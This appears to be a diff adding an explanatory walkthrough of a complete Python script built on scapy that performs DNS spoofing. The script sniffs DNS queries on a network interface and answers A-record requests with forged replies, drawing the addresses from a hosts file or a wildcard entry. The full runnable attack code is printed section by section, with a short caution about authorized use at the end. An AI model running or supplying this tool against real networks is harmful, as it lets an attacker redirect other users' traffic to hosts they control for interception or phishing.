@@ -1,0 +1,105 @@
+The provided code is a Python script designed to perform DNS spoofing, specifically to intercept DNS queries and respond with spoofed DNS responses. Let's break down the code and explain its workings:
+
+```python
+#!/usr/bin/python3
+
+import sys
+import getopt
+import scapy.all as scapy
+
+# Default network interface and DNS filter
+dev = "enp3s0f1"
+filter = "udp port 53"
+file = None
+dns_map = {}
+```
+
+- The script starts with importing necessary modules: `sys`, `getopt`, and `scapy.all`.
+- `sys` module provides access to system-specific parameters and functions.
+- `getopt` module parses command-line options.
+- `scapy.all` provides packet manipulation functionalities.
+- Default values for network interface (`dev`), DNS filter (`filter`), and a variable to hold DNS mappings (`dns_map`) are initialized.
+
+```python
+def handle_packet(packet):
+    ip = packet.getlayer(scapy.IP)
+    udp = packet.getlayer(scapy.UDP)
+    dns = packet.getlayer(scapy.DNS)
+    
+    # Standard (A record) DNS query
+    if dns.qr == 0 and dns.opcode == 0:
+        queried_host = dns.qd.qname.decode()[:-1]
+        resolved_ip = None
+        if dns_map.get(queried_host):
+            resolved_ip = dns_map.get(queried_host)
+        elif dns_map.get('*'):
+            resolved_ip = dns_map.get('*')
+        if resolved_ip:
+            dns_answer = scapy.DNSRR(rrname=queried_host+".",
+                                      ttl=330,
+                                      type="A",
+                                      rclass="IN",
+                                      rdata=resolved_ip)
+            dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
+                        scapy.UDP(sport=udp.dport, dport=udp.sport) / \
+                        scapy.DNS(id=dns.id,
+                                  qr=1,
+                                  aa=0,
+                                  rcode=0,
+                                  qd=dns.qd,
+                                  an=dns_answer)
+            print("Send %s has %s to %s" % (queried_host, resolved_ip, ip.src))
+            scapy.send(dns_reply, iface=dev)
+```
+
+- `handle_packet` function is defined to handle each packet intercepted by the script.
+- It extracts IP, UDP, and DNS layers from the packet.
+- If the DNS query is of type A record, it checks if there's a mapping for the queried host in `dns_map`.
+- If found, it constructs a spoofed DNS response with the resolved IP address and sends it back.
+
+```python
+def usage():
+    print(sys.argv[0] + " -f <hosts-file> -i <dev>")
+    sys.exit(1)
+
+def parse_host_file(file):
+    for line in open(file):
+        line = line.rstrip('\n')
+        if line:
+            ip, host = line.split()
+            dns_map[host] = ip
+```
+
+- `usage` function is defined to print usage instructions.
+- `parse_host_file` function parses the hosts file to populate the `dns_map` dictionary with IP-host mappings.
+
+```python
+try:
+    cmd_opts = "f:i:"
+    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+except getopt.GetoptError:
+    usage()
+
+for opt in opts:
+    if opt[0] == "-i":
+        dev = opt[1]
+    elif opt[0] == "-f":
+        file = opt[1]
+    else:
+        usage()
+
+if file:
+    parse_host_file(file)
+else:
+    usage()
+
+print("Spoofing DNS requests on %s" % dev)
+scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
+```
+
+- Command-line arguments are parsed using `getopt`.
+- The script expects `-f` for specifying the hosts file and `-i` for specifying the network interface.
+- It then parses the hosts file using `parse_host_file` function.
+- Finally, it starts sniffing packets on the specified network interface, applying the specified filter, and calling `handle_packet` for each packet sniffed.
+
+In summary, this script allows you to perform DNS spoofing by intercepting DNS queries on a network interface and responding to them with custom IP addresses. This can be used for various purposes, including network analysis, security testing, and penetration testing. However, it's important to use such tools responsibly and with proper authorization, as they can potentially disrupt network communications and cause security issues if misused.
